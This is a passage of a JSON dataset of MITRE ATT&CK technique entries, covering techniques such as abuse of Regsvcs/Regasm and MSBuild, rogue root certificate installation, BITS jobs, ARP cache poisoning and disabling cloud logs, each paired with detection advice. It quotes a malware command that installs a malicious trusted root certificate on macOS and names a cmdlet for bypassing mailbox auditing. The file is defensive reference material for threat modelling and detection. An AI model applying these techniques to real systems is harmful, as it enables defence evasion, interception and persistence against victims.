      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Logon Session: Logon Session Creation",
        "Logon Session: Logon Session Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nOn Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd).(Citation: Ubuntu SSSD Docs) \n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence."
    },
    "T1218.009": {
      "id": "T1218.009",
      "name": "Regsvcs/Regasm",
      "description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.009",
      "stix_id": "attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8",
      "created": "2020-01-23T19:42:16.439000+00:00",
      "modified": "2025-04-25T14:47:58.456000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed."
    },
    "T1553.004": {
      "id": "T1553.004",
      "name": "Install Root Certificate",
      "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553.004",
      "stix_id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839",
      "created": "2020-02-21T21:05:32.844000+00:00",
      "modified": "2025-04-15T19:59:06.251000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Windows Registry: Windows Registry Key Creation"
      ],
      "defense_bypassed": [],
      "detection": "A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072"
    },
    "T1037.003": {
      "id": "T1037.003",
      "name": "Network Logon Script",
      "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1037.003",
      "stix_id": "attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99",
      "created": "2020-01-10T18:01:03.666000+00:00",
      "modified": "2025-04-15T22:51:42.187000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Active Directory: Active Directory Object Modification",
        "File: File Modification",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon."
    },
    "T1499": {
      "id": "T1499",
      "name": "Endpoint Denial of Service",
      "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1499",
      "stix_id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
      "created": "2019-04-18T11:00:55.862000+00:00",
      "modified": "2025-04-15T22:28:03.155000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Containers",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Sensor Health: Host Status"
      ],
      "defense_bypassed": [],
      "detection": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS."
    },
    "T1027.004": {
      "id": "T1027.004",
      "name": "Compile After Delivery",
      "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.004",
      "stix_id": "attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617",
      "created": "2020-03-16T15:30:57.711000+00:00",
      "modified": "2025-04-15T19:59:06.564000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Creation",
        "Process: Process Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development."
    },
    "T1614": {
      "id": "T1614",
      "name": "System Location Discovery",
      "description": "\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1614",
      "stix_id": "attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979",
      "created": "2021-04-01T16:42:08.735000+00:00",
      "modified": "2025-04-15T23:14:16.731000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling <code> GetLocaleInfoW</code> to gather information.(Citation: FBI Ragnar Locker 2020)\n\nMonitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo."
    },
    "T1564.007": {
      "id": "T1564.007",
      "name": "VBA Stomping",
      "description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.007",
      "stix_id": "attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b",
      "created": "2020-09-17T12:51:40.845000+00:00",
      "modified": "2025-04-25T14:48:00.627000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Detection efforts should be placed finding differences between VBA source code and p-code.(Citation: Walmart Roberts Oct 2018) VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.(Citation: pcodedmp Bontchev)(Citation: oletools toolkit)\n\nIf the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the <code>PROJECT</code> stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the <code>PROJECT</code> stream will inhibit attempts of reading the VBA source code through the GUI.(Citation: FireEye VBA stomp Feb 2020)"
    },
    "T1197": {
      "id": "T1197",
      "name": "BITS Jobs",
      "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1197",
      "stix_id": "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:37:20.513000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "Service: Service Metadata"
      ],
      "defense_bypassed": [],
      "detection": "BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the \u2018Transfer\u2019, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)"
    },
    "T1127.001": {
      "id": "T1127.001",
      "name": "MSBuild",
      "description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1127.001",
      "stix_id": "attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96",
      "created": "2020-03-27T21:50:26.042000+00:00",
      "modified": "2025-04-16T20:37:20.712000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed."
    },
    "T1656": {
      "id": "T1656",
      "name": "Impersonation",
      "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1656",
      "stix_id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
      "created": "2023-08-08T15:42:18.906000+00:00",
      "modified": "2025-04-15T22:41:31.140000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1578.005": {
      "id": "T1578.005",
      "name": "Modify Cloud Compute Configurations",
      "description": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim\u2019s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535). ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1578.005",
      "stix_id": "attack-pattern--ca00366b-83a1-4c7b-a0ce-8ff950a7c87f",
      "created": "2023-09-05T14:19:17.486000+00:00",
      "modified": "2025-04-15T22:49:17.012000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1090.004": {
      "id": "T1090.004",
      "name": "Domain Fronting",
      "description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1090.004",
      "stix_id": "attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2",
      "created": "2020-03-14T23:29:19.581000+00:00",
      "modified": "2025-04-25T14:48:02.492000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)"
    },
    "T1557.002": {
      "id": "T1557.002",
      "name": "ARP Cache Poisoning",
      "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1557.002",
      "stix_id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
      "created": "2020-10-15T12:05:58.755000+00:00",
      "modified": "2025-04-15T21:43:10.406000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. \n\nConsider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned."
    },
    "T1562.008": {
      "id": "T1562.008",
      "name": "Disable or Modify Cloud Logs",
      "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.008",
      "stix_id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
      "created": "2020-10-12T13:52:32.846000+00:00",
      "modified": "2025-04-15T22:19:53.826000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Modification",
        "User Account: User Account Modification",
        "Cloud Service: Cloud Service Disable"
      ],
      "defense_bypassed": [],
